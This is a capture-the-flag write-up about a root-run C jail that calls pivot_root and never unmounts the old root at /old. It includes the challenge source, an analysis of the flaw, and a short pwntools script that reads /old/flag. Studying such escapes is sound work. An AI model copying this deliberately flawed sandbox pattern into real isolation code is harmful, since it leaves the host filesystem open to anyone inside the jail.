---
title: "Mount Namespace and pivot_root Escape"
description: "Escaping a mount namespace sandbox by accessing the old root filesystem which was not unmounted after pivot_root."
date: "2026-01-04"
order: 14
draft: false
---

# Mount Namespace and pivot_root Escape

## Challenge Source Code

```c
#include <assert.h>
#include <fcntl.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mount.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <unistd.h>

int main(int argc, char **argv) {
  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stdout, NULL, _IONBF, 0);

  for (int i = 3; i < 10000; i++)
    close(i);

  char new_root[] = "/tmp/jail-XXXXXX";
  char old_root[1024];

  assert(geteuid() == 0);

  // Create a new mount namespace
  assert(unshare(CLONE_NEWNS) != -1);

  // Create the jail root
  assert(mkdtemp(new_root) != NULL);

  // Change / to a private mount to allow pivot_root
  assert(mount(NULL, "/", NULL, MS_REC | MS_PRIVATE, NULL) != -1);

  // Bind-mount the new root over itself
  assert(mount(new_root, new_root, NULL, MS_BIND, NULL) != -1);

  // Create a directory for the old root
  snprintf(old_root, sizeof(old_root), "%s/old", new_root);
  assert(mkdir(old_root, 0777) != -1);

  // Pivot the root filesystem
  assert(syscall(SYS_pivot_root, new_root, old_root) != -1);

  // Bind-mount essential system directories
  assert(mkdir("/bin", 0755) != -1);
  assert(mount("/old/bin", "/bin", NULL, MS_BIND, NULL) != -1);
  assert(mkdir("/usr", 0755) != -1);
  assert(mount("/old/usr", "/usr", NULL, MS_BIND, NULL) != -1);
  assert(mkdir("/lib", 0755) != -1);
  assert(mount("/old/lib", "/lib", NULL, MS_BIND, NULL) != -1);
  assert(mkdir("/lib64", 0755) != -1);
  assert(mount("/old/lib64", "/lib64", NULL, MS_BIND, NULL) != -1);

  setresuid(0, 0, 0);
  assert(chdir("/") == 0);

  int fffd = open("/flag", O_WRONLY | O_CREAT);
  write(fffd, "try harder", 10);
  close(fffd);

  assert(execl("/bin/bash", "/bin/bash", "-p", NULL) != -1);
}
```

## Vulnerability Analysis

The challenge uses `pivot_root` to change the system root to a new directory. `pivot_root` moves the current root mount to a specified subdirectory (in this case, `/old`) and makes the new directory the root.

The vulnerability is that the program **fails to unmount the old root** from `/old` after the pivot. While it sets up a jail, it explicitly preserves access to the entire host filesystem at the `/old` mount point.

## Exploitation Plan

1. **Identify Old Root:** The old root filesystem is mounted at `/old`.
2. **Access Flag:** Since `/old` corresponds to the host's real root, the real flag (at `/flag` on the host) is accessible at `/old/flag`.
3. **Read Flag:** Use the provided shell to read the file.

## Exploit Script

```python
from pwn import *

elf = context.binary = ELF("./challenge")

p = process(elf.path)

# Access the flag through the preserved root
p.sendline(b"cat /old/flag")
print(p.recvall().decode())
```
